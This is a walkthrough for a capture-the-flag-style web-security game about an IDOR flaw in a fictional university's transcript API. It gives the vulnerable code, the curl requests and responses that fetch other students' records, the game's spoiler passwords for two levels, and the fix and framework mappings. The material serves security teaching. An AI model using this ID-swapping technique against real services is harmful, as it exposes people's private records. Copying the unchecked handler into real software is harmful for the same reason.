# level1@web — Carlos's Login Wall

**Track:** Web · **Client:** Meridian State University · **Compliance regime:** FERPA (20 U.S.C. § 1232g; 34 CFR Part 99) · **Builds on:** [`level0@web`](/walkthroughs/#/web/level0)

> ⚠ This page contains the full solve path **and** the breadcrumb credential for `level2@web`. If you haven't solved `level1@web` yet, close this tab and come back after. The puzzle is much more satisfying without spoilers, and the post-mortem below makes considerably more sense once you've felt the moment yourself.

---

## §1 — The setup

When you left `level0@web`, Meridian State University had about the tidiest incident a consultant could ask for. Carlos, Meridian's in-house web developer, eight months into the job and heir to the BluePier Digital mess, took yesterday's finding exactly the way you hope a client will. The autoindexed `/backup/` directory was gone within the hour. The DB credential rotation went into Friday's regular change window. Meridian told its cyber-insurance carrier, Cedarwood Mutual, before Cedarwood could find out any other way, so Cedarwood's renewal team now has "Meridian discovered and remediated within audit window" as the first bullet on the renewal worksheet.

This is not the kind of engagement where the client is the problem. Carlos is the solution; the problem was an agency that has since left the building.

During yesterday's clean-up call, Carlos mentioned, almost in passing, another project he had shipped recently. Students kept filing tickets for unofficial transcripts for graduate-school applications, and nobody wanted to wait out the registrar's three-business-day turnaround. So three weeks ago he wrote a "quick transcript download" endpoint and bolted it onto the student portal. Students sign in through Meridian SSO, click a button, and get a PDF (strictly, JSON that the front end renders as a PDF). The registrar approved it as a self-service convenience, and the security review consisted of one sentence: "it's behind SSO, so anyone calling it is a logged-in student."

Priya did not like the second half of that sentence.

She asked Carlos for the verification middleware and a captured SSO session to test with. He sent both before the end of the day, the same A-plus client behaviour as yesterday, and went home. Today's audit is that second project.

You are logged in as `webapp_admin` on `portal.meridian.edu`, by the same route the credential chain has followed since `level0@web`. The leaked DB credential `M3rid14n!2023-prod` from BluePier's `db-creds.txt` is, according to the comment in that file, also a shell user on the portal host. It is the same story as the network and crypto level1s: a service account meant to be database-only grew an interactive login at some point and nobody took it away. That shell access is a finding of its own. Today's finding is something else entirely.

The legal frame has not softened. FERPA applies to Meridian and to "education records", which under 34 CFR §99.3 explicitly include transcripts, and its enforcement mechanism remains "the federal government can withdraw your funding." FERPA has no HIPAA-style breach-notification clock, but the Department of Education's Privacy Technical Assistance Center expects "reasonable" notification timing for confirmed disclosures of education records to unauthorized parties, and Meridian's annual Federal Student Aid attestation will include any documented disclosure in the reporting cycle.[^department-of-education-privacy-technical] Today falls inside that cycle.

What you don't know yet is that Carlos's middleware does one job properly, authentication, and skips the second, authorization, entirely. The endpoint trusts whatever `student_id` it is handed and returns the matching transcript. Any student with an active session can pull any other student's transcript. The blast radius is the whole `transcripts` table: every current student, every former student, and every legacy system account nobody has got round to cleaning up since 2023.

## §2 — The solve

Read fifteen lines of code, decode one cookie, curl four URLs. That is the whole puzzle, and the bug is visible before you run anything.

### Step 1: Confirm the credential and what it bought you

```bash
guest@d3cyph3r:~$ ssh level1@web
level1@web's password: M3rid14n!2023-prod
Connected: level1@web
webapp_admin@web:~$ whoami
webapp_admin
webapp_admin@web:~$ pwd
/home/webapp_admin
```

That is the still-live DB credential from `level0@web`'s `db-creds.txt`, the same access anyone pulling it from the same exposed backup directory would have, and the reason Carlos booked Friday's rotation. You are on `portal.meridian.edu`, the student-portal host where Carlos's transcript endpoint runs and where the access logs are mirrored for observability.

### Step 2: Read the day-two context

```bash
webapp_admin@web:~$ ls
admin-access.log  is not here.  Try:
id-conventions.md       priya-note.md         transcript-api.js
lessons-learned.md      session.txt           welcome.md
```

Six files. Read them in order.

`welcome.md` covers mechanics: what you already know about `curl` and `cookies`, the difference between authentication and authorization, and pointers to the next four files. `priya-note.md` is the in-character handoff, with the day-two context, what Carlos said about the endpoint, the rules of engagement (no scripted enumeration) and the FERPA hooks. `transcript-api.js` is Carlos's vulnerable code, fifteen lines including imports. `session.txt` is the captured SSO session he sent for testing. `id-conventions.md` is Priya's write-up of Meridian's student-ID format, including the BluePier-era M-000xxxx legacy range. `lessons-learned.md` is for afterwards.

The critical pieces to extract before you do anything else:

- **No new commands today**: `curl` and `cookies` are the tools. The puzzle is in *how* you use them.
- **The auth model**: the SSO middleware confirms the requester is logged into Meridian. It does not confirm the requester is the *student whose transcript is being requested*. That's the lesson.
- **The legal frame**: same controlled-exception authorization as `level0@web` plus an explicit "do not enumerate at scale" constraint, targeted validation only.

### Step 3: Read Carlos's verify middleware

```bash
webapp_admin@web:~$ cat transcript-api.js
```

The relevant code:

```javascript
import express from "express";
import { requireMeridianSSO } from "./middleware/sso.js";
import { db } from "./db.js";

export const router = express.Router();

// Require an active Meridian SSO session for ALL routes in this router.
router.use(requireMeridianSSO);

router.get("/api/transcript", async (req, res) => {
  const studentId = req.query.student_id;
  if (!studentId) {
    return res.status(400).json({ error: "missing student_id" });
  }

  const transcript = await db.transcripts.findOne({ student_id: studentId });
  if (!transcript) {
    return res.status(404).json({ error: "not found" });
  }

  return res.json(transcript);
});
```

Read it slowly. The middleware does its job: `requireMeridianSSO` fills `req.session` with the authenticated user's identity (`req.session.studentId`, `req.session.email` and so on) and rejects anything without a valid SSO cookie. That part is correct, and it is exactly why the code looks finished.

Then the handler reads `req.query.student_id`, a URL parameter the caller controls, looks up the matching transcript and returns it. It **never compares `req.query.student_id` with `req.session.studentId`**. Whatever ID the caller asks for is the ID the API answers for, as long as the caller is *some* authenticated Meridian user. "Who are you?" got a careful answer. "Are you allowed to see this?" was never asked.

The fix is one line. The current code:

```javascript
const studentId = req.query.student_id;
```

would, in a correct implementation, be followed by:

```javascript
if (studentId !== req.session.studentId) {
  return res.status(403).json({ error: "forbidden" });
}
```

(Or, for registrar staff querying other students, a role check, or a central authorization helper that handles both cases.) The check is simply not there.

### Step 4: Confirm you're authenticated

```bash
webapp_admin@web:~$ cookies https://portal.meridian.edu
```

```
Cookies for: https://portal.meridian.edu
──────────────────────────────────────────
  MeridianSSO          = eyJzaWQiOiJ3ZWJhcHAtc3ZjLW1vbml0b3JpbmctMjAyNiIsImV4cCI6MjA5MTM0MTY0MH0
  csrf                 = Y2RmYTczNGItOWY4Yi00ZWQwLWFhMzgtZjQ4ZTQyZjZkM2Q0

Tip: base64-looking values can be decoded with: base64 -d <value>
```

The session cookie is set. `MeridianSSO` is the real cookie name, the one the middleware reads, and the value is base64-encoded JSON; decode it and you will see the session ID and the expiry. This is the credential the middleware honours.

The captured session belongs to `webapp-svc-monitoring`, a synthetic account Carlos set up so a nightly health check can ping the transcript endpoint for uptime. It looks exactly like a student session, and the middleware cannot tell the difference.

### Step 5: Exercise the endpoint against student IDs you already have

You have eight student IDs from yesterday's `students_export_2023.csv`, the BluePier-leaked dataset of 4,217 records: Aisha Patel was `M-1872941`, Marcus Reyes `M-1872995`, Jordan Smith `M-1873041`, plus Linh Tran, Tyler Brooks, Sara Kapoor, Dmitri Volkov and Olivia Chen. Priya's rules say to curl *a handful*, by hand, not the whole list and not in a script, and document what comes back.

```bash
webapp_admin@web:~$ curl 'https://portal.meridian.edu/api/transcript?student_id=M-1872941'
```

```json
{
  "student_id": "M-1872941",
  "first_name": "Aisha",
  "last_name": "Patel",
  "email": "patel.a@meridian.edu",
  "major": "Computer Science",
  "gpa": 3.91,
  "enrollment_status": "Active",
  "courses_completed": [
    {"code": "CS-301", "name": "Algorithms", "term": "Fall 2025", "grade": "A"},
    {"code": "CS-340", "name": "Operating Systems", "term": "Fall 2025", "grade": "A-"},
    {"code": "MATH-220", "name": "Linear Algebra", "term": "Spring 2026", "grade": "A"},
    {"code": "ENGL-202", "name": "Advanced Composition", "term": "Spring 2026", "grade": "B+"}
  ],
  "advisor": "Dr. Maria Sanchez",
  "advisor_notes": "On track for May 2026 graduation. Strong candidate for graduate study; encouraged to apply to CMU and UWashington.",
  "issued_at": "2026-04-09T14:23:00Z"
}
```

Aisha's full transcript comes back: grades, GPA, advisor notes, every course she has taken. The session that authenticated the request belongs to `webapp-svc-monitoring`. Aisha's own session never enters the picture.

Try another:

```bash
webapp_admin@web:~$ curl 'https://portal.meridian.edu/api/transcript?student_id=M-1873041'
```

```json
{
  "student_id": "M-1873041",
  "first_name": "Jordan",
  "last_name": "Smith",
  "major": "Mechanical Engineering",
  "gpa": 2.88,
  "enrollment_status": "Active — Academic Probation (since Spring 2026)",
  "courses_completed": [
    {"code": "ME-301", "name": "Thermodynamics", "term": "Fall 2025", "grade": "C-"},
    {"code": "ME-302", "name": "Fluid Mechanics", "term": "Spring 2026", "grade": "D+"}
  ],
  "advisor": "Dr. Henry Park",
  "advisor_notes": "Academic probation as of Spring 2026 (GPA fell below 3.0). Recommend tutoring referral + check-in with student wellness.",
  "issued_at": "2026-04-09T14:23:00Z"
}
```

Jordan's transcript, including his academic-probation status and his advisor's notes about referring him to tutoring and student wellness. Nothing here is anything Jordan would agree to share with another student, and the wellness referral is exactly the kind of detail that turns a disclosure from embarrassing into genuinely harmful.

The IDOR is confirmed. You do not need to enumerate any further to prove it. There is one more class of finding worth surfacing, though: the legacy ID range.

### Step 6: Read the ID conventions and try a legacy ID

```bash
webapp_admin@web:~$ cat id-conventions.md
```

```
Current students:      M-187xxxx   (issued 2018-onward, sequential
                                    by enrollment date)
Former students:       M-XXXXXXX   (range varies — 100000-999999
                                    depending on enrollment year)
Legacy / system:       M-000xxxx   (BluePier-era, created 2021-2023
                                    for testing, demo accounts,
                                    acceptance-QA scripts, etc.)
```

The legacy range is where it gets interesting. BluePier left things behind in `/backup/`, which was level0's finding, and according to Carlos's comment they left things in the database too: "We never finished migrating off the legacy M-000xxxx range. They're still in the database. The student-facing UI hides them but the API doesn't filter."

Try the lowest one:

```bash
webapp_admin@web:~$ curl 'https://portal.meridian.edu/api/transcript?student_id=M-0000001'
```

```json
{
  "student_id": "M-0000001",
  "first_name": "Test",
  "last_name": "Student",
  "email": "test@meridian.edu",
  "major": "[SYSTEM ACCOUNT — NOT A REAL STUDENT]",
  "gpa": 4.00,
  "enrollment_status": "Service / QA Account",
  "courses_completed": [],
  "advisor": "BluePier Digital (legacy)",
  "advisor_notes": "BLUEPIER DEMO ACCOUNT — DO NOT DELETE. Created 2023-08-12 by James for transcript-portal acceptance testing. Service account for end-to-end QA: portal-svc / pw=meridian-portal-svc-2026 / used by the automated nightly check that validates the registrar integration. Carlos: don't decommission this yet, the cutover to the new check is scheduled Q4 2024. — James, BluePier 2023-08-12",
  "issued_at": "2026-04-09T14:23:00Z"
}
```

The BluePier demo account is still in the database, and its `advisor_notes` field holds a credential in plain text. The cutover James mentioned was scheduled for Q4 2024, eighteen months before this audit, and clearly never happened. The service-account credential `meridian-portal-svc-2026` is still live, the demo account is still reachable through the same IDOR, and the credential is now sitting in your terminal.

That is the level2 breadcrumb. It is there because BluePier needed somewhere to stash a credential during 2023 acceptance testing, decided an `advisor_notes` field on a demo account was "a reasonable place", and never came back. It is the same habit that put the audit-bypass credential in a DNS TXT record in `level1@network` and a credential in a JWT payload claim in `level1@crypto`. Three different "convenient places", all chosen because nothing about the surface controlled what got written into it.

### Step 7: Confirm the API does return 404 for invalid IDs

```bash
webapp_admin@web:~$ curl 'https://portal.meridian.edu/api/transcript?student_id=M-9999999'
```

```json
{"error":"not found"}
```

This is a sanity check rather than a bug confirmation. The API does distinguish "valid ID, here is the record" from "no such ID", which means the responses for Aisha, Jordan and the BluePier demo were genuine database hits and not generic stubs or a honeypot. Worth a line in the report.

### Step 8: Document and stop

Priya's rules apply here, and they are the point. You do not iterate the M-187xxxx range. You do not enumerate every legacy ID. You do not try the registrar accounts (M-2xxxxxxx, per the conventions doc, unconfirmed because you did not look). You write up exactly what four queries demonstrated.

The minimum report content:

1. **The transcript API performs authentication without authorization.** `requireMeridianSSO` confirms an active Meridian session; the handler does not check that `req.query.student_id` matches `req.session.studentId`. Any logged-in Meridian student (or any party with a valid Meridian session, including service accounts) can request any other student's transcript.
2. **The vulnerability is exploitable at any scale.** Authenticated, unprivileged sessions return data for every record in the `transcripts` table. The validation curl-tests confirmed two real students (Aisha Patel, Jordan Smith) and one legacy demo account (M-0000001).
3. **The IDOR extends to legacy system accounts.** Meridian's `M-000xxxx` ID range still contains BluePier-era demo accounts. The student-facing UI hides them; the API does not filter them out. Their records may contain test data or operational metadata that shouldn't be reachable through an unauthorized API path.
4. **A live service-account credential is published in plain text in a record's `advisor_notes` field.** The BluePier demo account at M-0000001 carries `portal-svc` credential `meridian-portal-svc-2026`. The credential should be rotated and the demo account decommissioned outright.
5. **The `advisor_notes` field is a free-form text field with no schema constraint.** Anything anyone has ever written into it is recoverable through an IDOR-style query. The advisor_notes contents of other student records may contain similar leftovers from BluePier-era data.
6. **Session-token observation**: the captured SSO session's `exp` claim decodes to 2036-04-09, ten years out. A long-lived service-account token is a separate finding under NIST SP 800-63B-4 §5, *Session Management*, where short-lived tokens with proper refresh are the modern standard.[^nist-800-63b]

Send the report to Carlos with general counsel copied. He will have the fix out before lunch, because that is the kind of client he is.

```bash
webapp_admin@web:~$ exit
```

### Step 9 (game-world only): Use the breadcrumb

In a real engagement, today ends there. In D3CYPH3R the credential chain continues into `level2@web`, with the `portal-svc` account as the way in.

```bash
guest@d3cyph3r:~$ ssh level2@web
level2@web's password: meridian-portal-svc-2026
```

`level2@web` is playable, and its walkthrough picks up from here.

## §3 — The vulnerability

Today's finding looks like one missing line of code. It is actually a few failures stacked on top of each other, and the missing line is only the one you can see.

### Failure 1: Authentication without authorization (CWE-639 / CWE-862)

Carlos's middleware confirms the caller is *a* logged-in Meridian user. The handler then trusts whatever resource ID the URL supplies, so any logged-in user can ask for any record. The general pattern is **Insecure Direct Object Reference (IDOR)**: an endpoint takes a resource identifier, looks it up, and returns it without ever checking that the caller is allowed to see *that particular* resource.

The most precise CWE is **CWE-639: Authorization Bypass Through User-Controlled Key**.[^cwe-639] The catalog describes it as "the system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data", which reads like a summary of Carlos's handler.

Its parent is **CWE-285: Improper Authorization**,[^cwe-285] the broad umbrella for any authorization decision that is wrong or missing.

When the check is *entirely absent* rather than present and wrong, **CWE-862: Missing Authorization** fits better.[^cwe-862] Carlos's handler does not have a broken check; it has no check at all. CWE-862 is a regular on the CWE Top 25, which tells you how often this exact mistake ships.

(For completeness, **CWE-863: Incorrect Authorization** is the sibling where the check exists and gets the wrong answer. That is not Carlos's bug, because there is nothing there to get anything wrong.)[^cwe-863]

### Failure 2: The demo account that outlived its purpose

BluePier created the `M-0000001` demo account for transcript-portal acceptance testing in 2023, scheduled it for decommissioning in Q4 2024, and it is still live in 2026. Its `advisor_notes` field holds a service-account credential that was supposed to move into a real secrets manager when the new monitoring system arrived. Neither thing happened.

This is the sticky-account anti-pattern covered by NIST SP 800-53 Rev. 5 AC-2(3) *Disable Accounts* and CIS Critical Security Controls v8.1 safeguard 5.3 *Disable Dormant Accounts*.[^nist-800-53] It has the same shape as the `audit-bypass.atlas.internal` host and `audit-svc` account in `level1@network`. Different surface, same failure.

### Failure 3: Sensitive data in a free-form text field

`advisor_notes` exists for human comments like "encouraged to apply to CMU" or "recommend tutoring referral". During acceptance testing BluePier used it to stash a credential, on the reasoning that "it's just a string field, who's going to look at it on a system account?" The IDOR answers that question: anyone. Once an API will return any record, anything stashed in any free-text field of any record is recoverable the same way.

No single CWE covers it neatly. It sits under **CWE-200: Exposure of Sensitive Information to an Unauthorized Actor** (the broad umbrella, marked DISCOURAGED for mapping in the CWE catalog) together with **CWE-540: Inclusion of Sensitive Information in Source Code**, whose literal scope is source code but whose spirit, that sensitive data has no business in artifacts without credential-grade access control, applies here.[^cwe-540][^cwe-200] The narrower modern mapping is **CWE-312: Cleartext Storage of Sensitive Information**.[^cwe-312]

### The compound effect

Pull any one thread and see what is left:

- Add the per-resource authz check → IDOR closes; legacy demo records are still in the database but unreachable via the API; the credential in the advisor_notes is no longer recoverable through the IDOR path.
- Decommission the BluePier demo account → the credential the advisor_notes carries is gone; IDOR still works against current students.
- Move credentials out of free-form fields → IDOR still works, but no credential-class secrets recoverable that way; PII (transcripts) still exposed.

Each failure needs its own fix on its own timeline. The IDOR is one code change that can ship this afternoon. Decommissioning the demo account is a conversation with BluePier's successor, or more realistically a unilateral decision by Carlos, since BluePier's successor does not exist. Cleaning up free-text fields is a schema audit plus a one-off migration that scrubs known credential patterns from the existing data.

## §3.5 — Blast radius

| Dimension | This finding |
|---|---|
| Reached | Carlos's transcript-download endpoint, which authenticates correctly and never authorises |
| Who can exploit it | Any logged-in student, by changing `student_id` in the request |
| Records in scope | Every transcript in the system, which under 34 CFR § 99.3 are education records by name |
| Detectability | Requests are well-formed and authenticated, so they do not look anomalous |
| Escalates to | A BluePier-era demo account whose `advisor_notes` field carries the `level2@web` credential |
| Regime | FERPA education records (no notification duty, no fine schedule); any clock comes from state breach law attaching to the PII |

**Authentication passed. That is what makes this dangerous rather than
obvious.** The middleware does one job correctly and skips the second
entirely. Every request in the logs carries a valid session belonging to
a real, enrolled student, so there is no failed-login spike, no unusual
source, and nothing for a WAF to match. The absence of an alert here is
not evidence that the endpoint was not abused.

**The exposed population is every transcript, not the one you fetched.**
Demonstrating an IDOR on a single record establishes that the control is
missing, and a missing control has no per-record scope. The assessment
should report the finding as full-table reach and let Meridian's log
retention answer the separate question of what was actually taken, if it
can.

**Stale accounts widen the radius past the current roll.** The demo
account left over from the BluePier engagement is still live and still
carries a free-text notes field with a credential in it. Two distinct
failures meet there: an account that should have been removed at project
close, and a habit of parking secrets in fields designed for prose. The
IDOR is what a scanner might eventually find; the demo account is what an
attacker would actually use.

## §4 — Real-world parallels

IDOR is one of the most frequently disclosed vulnerability classes on modern web applications, and the reason is structural: frameworks make it easy to gate access on "is this a logged-in user?" and leave "does this particular record belong to this particular user?" entirely to you. A few named incidents show the range.

### Thread 1: USPS Informed Visibility (November 2018)

The United States Postal Service runs *Informed Visibility*, an API that lets logged-in USPS account holders see mail-tracking data. In November 2018 a security researcher found it would return tracking data for **any** account holder to any other authenticated account holder who asked. There was no check at all that the logged-in user owned the data being requested.

Krebs on Security, which broke the story, estimated **roughly 60 million** USPS user accounts were exposed.[^krebs-on-security-usps-site] Per the Krebs writeup the reachable data included email addresses, usernames, user IDs, account numbers, street addresses, phone numbers, authorized-user metadata and mailing-campaign data. USPS confirmed the issue and patched it, but the shape was exactly what you just walked through: an authenticated user, no per-resource authorization check, and predictable account identifiers. The only differences from Carlos's endpoint are scale and the kind of data (postal records instead of education records).

### Thread 2: Optus (September 2022)

Optus, Australia's second-largest telecommunications carrier, disclosed in September 2022 that an attacker had exfiltrated customer personal data through an unauthenticated API endpoint. The mechanism was IDOR's blunter cousin: an endpoint returning customer records by ID with no authentication requirement at all, which the attacker walked through by incrementing customer IDs and pulling records one after another.

The numbers moved as the investigation went on. Optus's early disclosure said "up to 10 million" customers. The OAIC's August 2025 Federal Court civil-penalty filing alleges interference with the privacy of approximately **9.5 million** Australians, approximately 2.1 million of whom had government-issued ID numbers (driver's licences, passports, Medicare numbers) exposed. Between the Australian Federal Police investigation, that single OAIC civil-penalty proceeding (with potential penalties of up to AUD $2.22 million per contravention), and the **AUD ~$140 million** Optus set aside for remediation (Equifax Protect subscriptions, the Deloitte external review, replacement documents), it is one of the most consequential privacy incidents in Australian history.[^optus-oaic-penalty]

Optus is the *unauthenticated* variant; Carlos's endpoint is the *authenticated* one. Optus's API asked nobody anything. Carlos's asks who you are and then forgets to ask what you are allowed to see. The blast radius looks the same. The remediation conversation is quite different.

### Thread 3: T-Mobile API (January 2023)

T-Mobile US disclosed in January 2023 that an attacker had used an API to collect personal data on approximately **37 million** prepaid and postpaid customers. It began in late November 2022 and was detected and stopped in mid-January 2023, a window of about seven weeks. Per T-Mobile's SEC 8-K, the mechanism was abuse of an API endpoint that returned customer records without adequate access controls on the resource requested.

The OWASP API Security Top 10 calls this **API1:2023, Broken Object Level Authorization (BOLA)**, and puts it first. T-Mobile is the recent reminder of what BOLA at scale against valuable data produces: an immediate breach disclosure and regulatory follow-up. The FCC opened an investigation, and the repetition mattered, since T-Mobile had already paid US$350 million to settle a class action over an earlier 2021 breach.[^tmobile-2023-8k]

### The base rate

Away from the headlines, IDOR and BOLA are consistently among the most frequently reported classes on bug-bounty platforms. HackerOne's annual *Hacker-Powered Security Report*, since renamed the *Security Research Report*, puts Broken or Improper Access Control among the top categories by volume, and Bugcrowd's *Inside the Mind of a Hacker* shows similar patterns. OWASP ranks Broken Access Control #1 in both the 2021 and 2025 Top 10, because the application-security data its contributors supply keeps putting the category at the top.

None of this persists because it is hard. Authentication comes from frameworks and middleware more or less turnkey ("add this line and your route is SSO-gated"), while authorization needs per-route logic that depends on the resource and the access model. Carlos used the framework's authentication middleware correctly, and then he stopped. That stopping point is the whole pattern.

## §5 — Frameworks, deep dive

The in-game post-mortem (`lessons-learned.md`) gives the high-level framework mapping. This section adds the specific section, control and paragraph identifiers an auditor would actually cite.

### CWE — Common Weakness Enumeration

**CWE-639: Authorization Bypass Through User-Controlled Key.**[^cwe-639] The most precise weakness ID. The catalog entry describes the weakness as "the system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data." MITRE mapping status: **ALLOWED**.

**CWE-862: Missing Authorization.**[^cwe-862] The variant where the authorization check is entirely absent. Carlos's handler is CWE-862, the check on `student_id` ownership is missing entirely, not present-but-wrong. MITRE mapping status: **ALLOWED-WITH-REVIEW** (CWE-862 is a Class-level weakness; the catalog recommends reviewing Base-level children before mapping). CWE-862 has been a recurring CWE Top 25 entry, climbing to #9 on the 2024 edition and #4 on the 2025 edition.

**CWE-863: Incorrect Authorization.**[^cwe-863] The sibling weakness where the check exists but produces the wrong answer. Not Carlos's case directly; cited here as the differentiator.

**CWE-285: Improper Authorization.**[^cwe-285] The broad parent for the authorization-failure family. MITRE mapping status: **DISCOURAGED**, the catalog explicitly recommends mappers use CWE-862 *Missing Authorization* or CWE-863 *Incorrect Authorization* (or a narrower variant like CWE-639) instead. CWE-285 is included here as the historical / hierarchy reference only; for surgical analytics, always reach for CWE-862 / CWE-863 / CWE-639.

**CWE-200: Exposure of Sensitive Information to an Unauthorized Actor.** The umbrella for any sensitive-data disclosure. MITRE marks CWE-200 as **DISCOURAGED for mapping**, it's frequently misused as a catch-all when a more specific weakness applies. Use the more specific weakness (CWE-639 / CWE-862 here) and cite CWE-200 only for framework-mapping reference.

**CWE-312: Cleartext Storage of Sensitive Information.**[^cwe-312] Maps the BluePier-demo credential stored in plain text in an `advisor_notes` field. The catalog text covers exactly this case, credential data stored unencrypted in a database field.

### FERPA — 20 U.S.C. § 1232g; 34 CFR Part 99

The Family Educational Rights and Privacy Act and its implementing regulations.

**34 CFR §99.3, Definitions.** The "education records" definition explicitly includes records that contain information directly related to a student, maintained by an educational agency receiving federal funding. Transcripts (grades, courses, GPA, advisor notes) are the textbook example.

**34 CFR §99.31, Conditions under which prior consent is not required to disclose information.** The regulation enumerates the specific categories of disclosure permitted without prior written consent (school officials with legitimate educational interest, other schools, parents of dependent students, etc.). An anonymous IDOR-via-authenticated-student-session disclosure is not among the enumerated categories. Each disclosure made via the vulnerable endpoint is a §99.31 violation.

**34 CFR §99.32, Recordkeeping requirements.** Disclosures, other than to directory-information recipients, school officials or under subpoena, must be recorded with the date, the party and the basis. The IDOR disclosures have none of that. The exposure created a stream of disclosures that are undocumented, undated and untracked.

**34 CFR §99.7, Annual notification.** Universities must annually notify students of their FERPA rights, including the right to inspect and challenge records. A confirmed IDOR exposure of transcript data is the kind of incident that needs to be referenced in subsequent annual notifications to enrolled students.

**The enforcement mechanism.** FERPA does not have a federal-level civil-penalty schedule. Enforcement is administrative, the Department of Education can find an institution noncompliant and, in extreme cases, suspend the institution's eligibility for Federal Student Aid (the Title IV programs). For public universities, FSA eligibility is existential.

### NIST SP 800-171 Rev. 3

NIST Special Publication 800-171 *Protecting Controlled Unclassified Information (CUI) in Nonfederal Systems and Organizations*, Revision 3 (May 2024, supersedes Rev. 2).[^nist-800-171] Universities map to this standard for FSA-related CUI handling. The Rev. 3 numbering uses the format 03.xx.xx (three-digit family + two-digit control + optional enhancement).

**03.01.01, Account Management.** Covers account lifecycle: creation, modification, disabling. The BluePier demo account that outlived its purpose is a direct violation.

**03.01.02, Access Enforcement.** The system shall enforce approved authorizations for logical access to CUI and system resources in accordance with applicable access-control policies. Carlos's endpoint enforces nothing on the resource side.

**03.01.05, Least Privilege.** Authorize only the access users need for their assigned tasks. The SSO middleware's authorization scope is simply "logged in", which is far wider than anything the transcript endpoint should grant.

### NIST SP 800-53 Rev. 5

The federal control catalog. Applies broadly outside federal scope as the most comprehensive controls reference.

**AC-3, Access Enforcement.** The system must enforce approved authorizations for logical access. Carlos's endpoint enforces nothing on the resource-ownership dimension; AC-3 is failed.

**AC-6, Least Privilege.** The SSO-authenticated user has more access than the user's role justifies for the transcript-download use case. The control envisions per-action authorization decisions, not blanket access-by-authentication.

**AC-4, Information Flow Enforcement.** Information flows between subjects and objects must be controlled. Student records (the objects) are flowing to subjects (other students, service accounts) who shouldn't be receiving them.

**AC-2(3), Disable Accounts.** The BluePier demo account's continued existence past its scheduled removal date is the violation. AC-2(3) requires disabling accounts no longer needed within an organization-defined time period.

### CIS Critical Security Controls v8.1

The Center for Internet Security's *Critical Security Controls v8.1* (June 2024).

**6.7, Centralize Access Control.** Manage access control for all enterprise assets through a centralized access management platform. Ad-hoc per-route authorization logic (or no authorization logic, as here) is the opposite of centralized.

**16.10, Apply Secure Design Principles in Application Architectures.** The safeguard covers the layered model: authentication, authorization, input validation, output encoding, error handling. Carlos's endpoint gets the first layer right and skips the second.

**5.3, Disable Dormant Accounts.** The BluePier demo at M-0000001 has been dormant past the cutover-Q4-2024 schedule. CIS 5.3 calls for explicit periodic review and disabling.

### OWASP

**OWASP Top 10 (2025), A01: Broken Access Control.**[^owasp-top-10-2025-a01] Held the #1 slot from 2021 to 2025. IDOR is the most-cited example in the category description. The category covers "violation of the principle of least privilege or deny by default," "bypassing access control checks by modifying the URL," and "IDOR (Insecure Direct Object References)." All three apply directly to Carlos's endpoint.

**OWASP API Security Top 10 (2023), API1: Broken Object Level Authorization (BOLA).**[^owasp-api-security-top-10] OWASP's API-specific Top 10 (last updated in 2023) has had Broken Object Level Authorization as API1 since the list was first published in 2019. The category description names "the most common API attack vector", IDOR's API expression. The remediation guidance is the same as OWASP A01: check authorization on every resource access, regardless of the authentication state.

### Cloud-native / SDLC frameworks worth knowing

**OWASP ASVS (Application Security Verification Standard) v5.0.**[^owasp-asvs-v5-0-v4] ASVS publishes a verification checklist for application security at three increasing levels. Section V4 *Access Control* explicitly requires (Level 1, the minimum) per-request authorization checks against the authenticated principal. Carlos's endpoint fails V4.1.1 (the trivially obvious one).

**OWASP Cheat Sheet, Authorization.** <https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html>. Walks through the layered model (authentication vs authorization), the centralization pattern, the per-resource-check pattern, and the audit-the-codebase pattern. Read it as a defender; hand it to Carlos.

## §6 — Cert exam relevance

IDOR is taught everywhere, from entry-level certs to hands-on web-pentest exams. If you are studying for any of these, you will meet this exact pattern, usually wearing a slightly different student ID.

**CompTIA Security+ (SY0-701).**[^cert-security-plus] The current exam (released November 2023). Domain 2 (*Threats, Vulnerabilities, and Mitigations*) covers application-layer vulnerabilities including IDOR / Broken Access Control. Domain 3 (*Security Architecture*) covers the authentication-vs-authorization distinction.

**CompTIA PenTest+ (PT0-003).**[^cert-pentest-plus] The current exam (released December 2024, replacing PT0-002 which sunset mid-2025). Domain 3 (*Attacks and Exploits*) names IDOR in the web-application-attack taxonomy and tests candidates' ability to identify and exploit it in hands-on lab scenarios.

**CompTIA CySA+ (CS0-003).**[^cert-cysa] The current exam (released June 2023). Domain 2 (*Threat Intelligence*) covers IDOR detection patterns, log-based detection of cross-user access patterns is a named module.

**(ISC)² CISSP.**[^cert-cissp] Domain 3 (*Security Architecture and Engineering*), the authentication / authorization distinction is a CISSP fundamental. The CBK chapters on access-control models (DAC, MAC, RBAC, ABAC) all cover the per-resource-check pattern.

**Offensive Security OSWA / OSWE / OSCP.**[^cert-oswe][^cert-oscp] OffSec's web-focused certs spend substantial curriculum time on IDOR. The OSWE exam (Web Expert) includes IDOR-style challenges as a recurring test of the candidate's ability to identify authorization failures in real applications. The OSWA (Web Assessor) covers IDOR exploitation in its initial-attacks module. The OSCP touches IDOR briefly but the deep treatment lives in the web-specific certs.

**SANS GIAC GWAPT (GIAC Web Application Penetration Tester).**[^cert-gwapt] Covers IDOR in depth. The associated course (SEC542) maps IDOR to its OWASP categorization and walks through detection in the labs.

## §7 — What a defender does

The short version is in the in-game `lessons-learned.md`. This expands each point into the operational detail you need to actually ship the fix.

### 1. Fix the endpoint

The minimal fix for Carlos's specific case:

```javascript
router.get("/api/transcript", async (req, res) => {
  const studentId = req.query.student_id;
  if (!studentId) {
    return res.status(400).json({ error: "missing student_id" });
  }

  // Authorization check: the authenticated student can only request
  // their own transcript. Non-self queries require the registrar role.
  if (studentId !== req.session.studentId) {
    if (!req.session.roles?.includes("registrar")) {
      return res.status(403).json({ error: "forbidden" });
    }
  }

  const transcript = await db.transcripts.findOne({ student_id: studentId });
  if (!transcript) {
    return res.status(404).json({ error: "not found" });
  }

  return res.json(transcript);
});
```

Three lines added. The check enforces the most basic ownership constraint (student requesting their own transcript) and an explicit role exception for the registrar's office.

### 2. Centralize authorization

Per-route ownership checks are fragile because every new route needs the check, and the next junior developer who adds a route will forget. The better long-term answer is to centralize authorization decisions in a policy layer:

- **Open Policy Agent (OPA)** + Rego policies (<https://www.openpolicyagent.org/>): policies as code, evaluated by a sidecar or library, applied at the application middleware layer.
- **Casbin** (<https://casbin.apache.org/>): policy library with multiple model support (ACL, RBAC, ABAC), available in many languages. (The project joined the Apache Software Foundation; the older `casbin.org` URL 301-redirects to the new home.)
